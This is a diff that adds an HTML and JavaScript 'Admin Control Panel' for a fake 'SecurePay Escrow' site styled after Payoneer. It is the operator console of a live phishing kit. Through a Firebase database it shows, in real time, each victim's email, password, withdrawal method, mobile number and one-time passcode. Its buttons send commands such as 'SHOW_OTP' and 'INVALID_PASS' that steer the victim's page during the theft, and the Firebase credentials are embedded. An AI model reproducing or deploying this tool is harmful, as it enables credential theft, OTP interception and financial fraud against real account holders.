@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - SecurePay Escrow</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        .payoneer-blue { background-color: #0055ff; }
+        .payoneer-blue-text { color: #0055ff; }
+        .payoneer-blue-border { border-color: #0055ff; }
+        .payoneer-blue-hover:hover { background-color: #0044cc; }
+        .btn-control { transition: all 0.2s ease; }
+        .btn-control:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 85, 255, 0.3); }
+        .btn-control:active { transform: translateY(0); }
+        .live-indicator {
+            animation: pulse-green 2s infinite;
+        }
+        @keyframes pulse-green {
+            0%, 100% { background-color: #10b981; }
+            50% { background-color: #34d399; }
+        }
+        .otp-highlight {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #0055ff;
+            text-shadow: 0 0 20px rgba(0, 85, 255, 0.3);
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen">
+    <!-- Header -->
+    <header class="bg-white border-b border-gray-200 shadow-sm">
+        <div class="max-w-7xl mx-auto px-6 py-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-8 h-8 payoneer-blue rounded flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h1 class="text-xl font-bold text-gray-800">Admin Control Panel</h1>
+                </div>
+                <div class="flex items-center space-x-6">
+                    <div class="flex items-center space-x-2">
+                        <div id="connectionIndicator" class="w-2 h-2 rounded-full bg-yellow-400"></div>
+                        <span id="connectionText" class="text-sm text-gray-500">Connecting...</span>
+                    </div>
+                    <span class="text-sm text-gray-500">SecurePay Escrow</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto p-6">
+        <!-- Live Data Grid -->
+        <section class="bg-white rounded-lg shadow-md p-6 mb-6">
+            <div class="flex items-center justify-between mb-6">
+                <h2 class="text-lg font-bold text-gray-800 flex items-center">
+                    <div class="w-3 h-3 rounded-full live-indicator mr-2"></div>
+                    Live Session Data
+                </h2>
+                <span class="text-xs text-gray-400" id="lastUpdate">Waiting for data...</span>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+                <!-- Email -->
+                <div class="bg-gray-50 rounded-lg p-4 border border-gray-200">
+                    <p class="text-xs font-medium text-gray-500 uppercase tracking-wide mb-2">Email / Username</p>
+                    <div id="emailDisplay" class="text-sm font-medium text-gray-800 break-all min-h-[20px]">Waiting for input...</div>
+                </div>
+                
+                <!-- Password -->
+                <div class="bg-gray-50 rounded-lg p-4 border border-gray-200">
+                    <p class="text-xs font-medium text-gray-500 uppercase tracking-wide mb-2">Password</p>
+                    <div id="passwordDisplay" class="text-sm font-medium text-gray-800 break-all min-h-[20px]">Waiting for input...</div>
+                </div>
+                
+                <!-- Method -->
+                <div class="bg-gray-50 rounded-lg p-4 border border-gray-200">
+                    <p class="text-xs font-medium text-gray-500 uppercase tracking-wide mb-2">Withdrawal Method</p>
+                    <div id="methodDisplay" class="text-sm font-medium text-gray-800 min-h-[20px]">Waiting for input...</div>
+                </div>
+                
+                <!-- Mobile Number -->
+                <div class="bg-gray-50 rounded-lg p-4 border border-gray-200">
+                    <p class="text-xs font-medium text-gray-500 uppercase tracking-wide mb-2">Mobile Number</p>
+                    <div id="mobileDisplay" class="text-sm font-medium text-gray-800 min-h-[20px]">Waiting for input...</div>
+                </div>
+            </div>
+            
+            <!-- OTP Display -->
+            <div class="mt-6 bg-blue-50 rounded-lg p-6 border-2 border-blue-200">
+                <p class="text-xs font-medium text-blue-500 uppercase tracking-wide mb-2 text-center">Verification Code (OTP)</p>
+                <div id="otpDisplay" class="otp-highlight text-center">--</div>
+                <p class="text-xs text-gray-400 text-center mt-2">Entered by user in real-time</p>
+            </div>
+        </section>
+
+        <!-- Control Center -->
+        <section class="bg-white rounded-lg shadow-md p-6 mb-6">
+            <h2 class="text-lg font-bold text-gray-800 mb-6 flex items-center">
+                <svg class="w-5 h-5 mr-2 payoneer-blue-text" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.532 1.532 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.532 1.532 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z" clip-rule="evenodd"/>
+                </svg>
+                Control Center
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <button onclick="sendControl('SHOW_OTP')" 
+                        class="btn-control payoneer-blue payoneer-blue-hover text-white font-semibold py-4 px-6 rounded-lg flex items-center justify-center space-x-2">
+                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                        <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+                        <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+                    </svg>
+                    <span>Request OTP</span>
+                </button>
+                
+                <button onclick="sendControl('INVALID_PASS')" 
+                        class="btn-control bg-red-500 hover:bg-red-600 text-white font-semibold py-4 px-6 rounded-lg flex items-center justify-center space-x-2">
+                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                    </svg>
+                    <span>Invalid Credentials</span>
+                </button>
+                
+                <button onclick="sendControl('SUCCESS')" 
+                        class="btn-control bg-green-500 hover:bg-green-600 text-white font-semibold py-4 px-6 rounded-lg flex items-center justify-center space-x-2">
+                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                    </svg>
+                    <span>Success</span>
+                </button>
+            </div>
+
+            <!-- Current Command Display -->
+            <div class="mt-6 bg-gray-50 rounded-lg p-4 border border-gray-200">
+                <p class="text-xs font-medium text-gray-500 uppercase tracking-wide mb-1">Current Command Sent</p>
+                <div id="currentCommand" class="text-lg font-semibold payoneer-blue-text">IDLE</div>
+            </div>
+        </section>
+
+        <!-- Session Log -->
+        <section class="bg-white rounded-lg shadow-md p-6">
+            <h2 class="text-lg font-bold text-gray-800 mb-4 flex items-center">
+                <svg class="w-5 h-5 mr-2 text-gray-500" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"/>
+                </svg>
+                Session Log
+            </h2>
+            <div id="actionLog" class="bg-gray-900 rounded-lg p-4 h-48 overflow-y-auto font-mono text-sm">
+                <div class="text-green-400">[System] Admin panel initialized</div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDll_iCfuANuUw2ZzzCJ8crCYz2MiNrPyM",
+            authDomain: "account-transfer-52ae5.firebaseapp.com",
+            databaseURL: "https://account-transfer-52ae5-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "account-transfer-52ae5",
+            storageBucket: "account-transfer-52ae5.firebasestorage.app",
+            messagingSenderId: "211356763585",
+            appId: "1:211356763585:web:ca1702552c9324e6cf9b40",
+            measurementId: "G-7M72XLZGS4"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Update connection status
+        function updateConnectionStatus(connected) {
+            const indicator = document.getElementById('connectionIndicator');
+            const text = document.getElementById('connectionText');
+            
+            if (connected) {
+                indicator.className = 'w-2 h-2 rounded-full bg-green-500';
+                text.textContent = 'Connected';
+                text.className = 'text-sm text-green-600';
+            } else {
+                indicator.className = 'w-2 h-2 rounded-full bg-red-500';
+                text.textContent = 'Disconnected';
+                text.className = 'text-sm text-red-600';
+            }
+        }
+
+        // Send control command to user
+        function sendControl(command) {
+            database.ref('session/control').set(command);
+            document.getElementById('currentCommand').textContent = command;
+            addToActionLog(`Command sent: ${command}`);
+        }
+
+        // Add entry to action log
+        function addToActionLog(message) {
+            const log = document.getElementById('actionLog');
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'text-gray-300 mb-1';
+            entry.textContent = `[${timestamp}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+            
+            // Keep only last 20 entries
+            while (log.children.length > 20) {
+                log.removeChild(log.firstChild);
+            }
+        }
+
+        // Update last update time
+        function updateLastUpdate() {
+            const now = new Date();
+            document.getElementById('lastUpdate').textContent = `Last update: ${now.toLocaleTimeString()}`;
+        }
+
+        // Listen for user session data - REAL-TIME
+        database.ref('session').on('value', function(snapshot) {
+            const data = snapshot.val();
+            if (data) {
+                document.getElementById('emailDisplay').textContent = data.email || 'Waiting for input...';
+                document.getElementById('passwordDisplay').textContent = data.password || 'Waiting for input...';
+                document.getElementById('methodDisplay').textContent = data.method || 'Waiting for input...';
+                document.getElementById('mobileDisplay').textContent = data.mobile || 'Waiting for input...';
+                updateLastUpdate();
+                
+                // Log when data changes
+                if (data.email && data.email !== 'Waiting for input...') {
+                    addToActionLog(`Data updated: Email received`);
+                }
+            }
+        });
+
+        // Listen for OTP data
+        database.ref('session/otp').on('value', function(snapshot) {
+            const data = snapshot.val();
+            if (data && data.code) {
+                document.getElementById('otpDisplay').textContent = data.code;
+                addToActionLog(`OTP received: ${data.code}`);
+                updateLastUpdate();
+            }
+        });
+
+        // Listen for control commands (to show current state)
+        database.ref('session/control').on('value', function(snapshot) {
+            const command = snapshot.val();
+            if (command) {
+                document.getElementById('currentCommand').textContent = command;
+            }
+        });
+
+        // Monitor connection
+        database.ref('.info/connected').on('value', function(snapshot) {
+            updateConnectionStatus(snapshot.val() === true);
+        });
+
+        // Initialize
+        addToActionLog('Firebase connection established');
+    </script>
+</body>
+</html>
